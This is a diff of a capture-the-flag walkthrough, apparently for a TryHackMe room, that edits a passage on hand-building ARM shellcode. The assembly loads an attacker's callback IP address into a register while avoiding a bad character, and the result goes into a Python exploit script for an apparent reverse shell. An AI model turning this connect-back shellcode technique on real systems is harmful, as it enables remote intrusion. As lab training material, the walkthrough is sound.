@@ -128,27 +128,29 @@ So now we have value of `23374016` (decimal) stored in register R1.  If we conve
 
 If you've managed to follow my reasoning this far, it should be clear that we are taking the little-endian representation of the IP address, converting it to decimal and then storing appropriate hex values to register R1 to represent this.  In our case this is complicated a bit further by the fact that we have to avoid the hex values defined in the `BADCHARS` variable.
 
-Now that we've understood how this works, we can craft our own hex byte string that points back to our local machine IP address - in our case this will be `10.10.233.1`.
+Now that we've understood how this works, we can craft our own hex byte string that points back to our local machine IP address - in our case this will be `10.10.52.240`.
 
 ```
 /* ADDR */
-mov r1, #0x01   // store '1' in R1
+mov r1, #0xf0   // store '240' in R1
 lsl r1, #8      // shift by 8 bits to the left
-add r1, #0xe9   // add '233' to R1
-lsl r1, #8      // shift by 8 bits to the left
-add r1, #0x08   // add '8' and '2' to R1 (since we cannot pass the hex value for 10; '0x0a'
-add r1, #0x02
+add r1, #0x34   // add '52' to R1
 lsl r1, #8      // shift by 8 bits to the left
 add r1, #0x08   // add '8' and '2' to R1 (since we cannot pass the hex value for 10; '0x0a'
 add r1, #0x02
 lsl r1, #8      // shift by 8 bits to the left
+add r1, #0x08   // add '8' and '2' to R1 (since we cannot pass the hex value for 10; '0x0a'
+add r1, #0x02
 push {r1}       
 ```
 Now we can simply copy this set of instructions to the assembler and convert it to a hex string we can paste into the Python Script:
 
 ![image](https://github.com/beta-j/TryHackMe-Rooms/assets/60655500/e90c2569-f13d-42d5-8eb3-3b0ecacc003c)
 
-You can follow [THIS LINK](https://shell-storm.org/online/Online-Assembler-and-Disassembler/?inst=mov+r1%2C+%230x01++%0D%0Alsl+r1%2C+%238++++%0D%0Aadd+r1%2C+%230xe9+++%0D%0Alsl+r1%2C+%238++++++%0D%0Aadd+r1%2C+%230x08+++%0D%0Aadd+r1%2C+%230x02%0D%0Alsl+r1%2C+%238++++++%0D%0Aadd+r1%2C+%230x08+++%0D%0Aadd+r1%2C+%230x02%0D%0Alsl+r1%2C+%238++++++%0D%0Apush+%7Br1%7D++&arch=arm&as_format=inline#assembly) and simply change the `#0x01` and `#0xe9` values to correspond to your IP address - but remember to avoid using any *bad characters*!
+You can follow [THIS LINK](https://shell-storm.org/online/Online-Assembler-and-Disassembler/?inst=mov+r1%2C+%230xf0++%0D%0Alsl+r1%2C+%238++++%0D%0Aadd+r1%2C+%230x34+++%0D%0Alsl+r1%2C+%238++++++%0D%0Aadd+r1%2C+%230x08+++%0D%0Aadd+r1%2C+%230x02%0D%0Alsl+r1%2C+%238++++++%0D%0Aadd+r1%2C+%230x08+++%0D%0Aadd+r1%2C+%230x02++++%0D%0Apush+%7Br1%7D++&arch=arm&as_format=inline#assembly) and simply change the `#0xf0` and `#0x34` values to correspond to your IP address - but remember to avoid using any *bad characters*!
+
+
+![image](https://github.com/beta-j/TryHackMe-Rooms/assets/60655500/c407311b-5deb-4533-95e3-7cc1a944a6ea)
 
 
 
